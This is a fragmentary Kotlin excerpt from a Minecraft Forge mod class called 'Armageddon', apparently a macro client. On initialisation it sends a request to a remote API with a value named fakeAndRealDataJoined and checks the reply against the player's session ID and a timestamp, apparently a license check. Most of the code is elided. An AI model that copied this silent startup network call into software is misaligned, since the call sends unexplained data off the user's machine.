...
class Armageddon {
    ...
    fun onInit(event: FMLInitializationEvent) {
        ...
        val url = "https://macrohq.dev/api/Q6W2ecZlZ3InKEEriO7onlQ1i1vAVCC9ipOF4qwsfNIK1xg6Z80NZTgbXbOJ?DvigquT6UAztO5IdMb0iIex6skfcHrPs8lDeTCxLfzG98n0AdNWeIN2VX3Kd=$fakeAndRealDataJoined"
            ...
            OkHttpClient().newCall(request).execute().use { response ->
                ...
                if (responseBody != null) {
                    ...
                    if (
                        ...
                        && mc.session.playerID == split[2]
                        && System.currentTimeMillis() - split[3].toLong() < 20000) {
